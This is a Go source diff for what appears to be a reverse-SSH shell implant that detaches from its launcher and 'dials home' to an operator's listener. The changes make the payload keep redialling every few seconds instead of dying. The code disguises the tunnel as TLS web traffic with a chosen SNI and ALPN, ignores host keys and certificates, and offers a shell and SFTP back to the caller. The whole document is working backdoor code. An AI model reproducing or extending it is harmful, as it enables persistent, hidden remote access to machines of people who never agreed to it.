@@ -59,6 +59,9 @@ type params struct {
 
 const detachEnvKey = "_SHELL_TUNNEL_DETACHED"
 
+// dialRetryDelay is how long a dial-home attempt waits before trying again.
+const dialRetryDelay = 5 * time.Second
+
 func shouldDetach() bool {
 	if os.Getenv(detachEnvKey) == "1" {
 		return false
@@ -149,10 +152,10 @@ func createSFTPHandler() ssh.SubsystemHandler {
 			outWarnf("Sftp server init error: %v", err)
 			return
 		}
+		defer server.Close()
 
 		outInfof("New sftp connection from %s", s.RemoteAddr().String())
 		if err := server.Serve(); err == io.EOF {
-			server.Close()
 			outInfof("Sftp connection closed by client")
 		} else if err != nil {
 			outWarnf("Sftp server exited with error: %v", err)
@@ -205,27 +208,32 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
 	}
 
-	// Attempt to connect with localPassword initially and keep asking for password on failure
+	// Attempt to connect with localPassword initially and keep asking for
+	// password on failure. A dial-home payload must outlive the listener
+	// being late and VPN blips, so a failed attempt is retried every
+	// dialRetryDelay instead of killing the process; only a password we
+	// cannot ask for ends the loop.
 	for {
 		if tlsWrap {
 			// TLS-wrapped connection: TCP -> TLS -> SSH
 			tcpConn, dialErr := net.Dial("tcp", address)
 			if dialErr != nil {
-				return nil, dialErr
+				err = dialErr
+			} else {
+				tlsConfig := &tls.Config{
+					InsecureSkipVerify: true,
+					ServerName:         tlsSNI,
+					NextProtos:         []string{"h2", "http/1.1"},
+				}
+				tlsConn := tls.Client(tcpConn, tlsConfig)
+				sshConn, chans, reqs, dialErr := gossh.NewClientConn(tlsConn, address, config)
+				if dialErr == nil {
+					client = gossh.NewClient(sshConn, chans, reqs)
+					break
+				}
+				tlsConn.Close()
+				err = dialErr
 			}
-			tlsConfig := &tls.Config{
-				InsecureSkipVerify: true,
-				ServerName:         tlsSNI,
-				NextProtos:         []string{"h2", "http/1.1"},
-			}
-			tlsConn := tls.Client(tcpConn, tlsConfig)
-			sshConn, chans, reqs, dialErr := gossh.NewClientConn(tlsConn, address, config)
-			if dialErr == nil {
-				client = gossh.NewClient(sshConn, chans, reqs)
-				break
-			}
-			tlsConn.Close()
-			err = dialErr
 		} else {
 			client, err = gossh.Dial("tcp", address, config)
 			if err == nil {
@@ -235,18 +243,21 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 
 		if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
 			fmt.Println("Enter password:")
-			data, err := term.ReadPassword(int(syscall.Stdin))
-			if err != nil {
-				outWarnf("%v", err)
-				continue
+			data, readErr := term.ReadPassword(int(syscall.Stdin))
+			if readErr != nil {
+				// No terminal to ask on: retrying would spin forever
+				// redialling, so give the error back instead.
+				return nil, readErr
 			}
 
 			config.Auth = []gossh.AuthMethod{
 				gossh.Password(string(data)),
 			}
-		} else {
-			return nil, err
+			continue
 		}
+
+		outWarnf("Dialling home to %s failed: %v; retrying in %s", address, err, dialRetryDelay)
+		time.Sleep(dialRetryDelay)
 	}
 
 	bindAddr := fmt.Sprintf("127.0.0.1:%d", homeBindPort)
@@ -367,9 +378,10 @@ Credentials:
 	 * PubKey   "%[4]s"
 `, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell, LPORT, BPORT, LUSER)
 
+	// Print only: flag.ExitOnError exits 0 for -h and 2 for a parse error
+	// (0 ok, 1 runtime, 2 usage), so Usage itself must never exit.
 	flag.Usage = func() {
 		fmt.Print(help)
-		os.Exit(1)
 	}
 
 	p := params{}
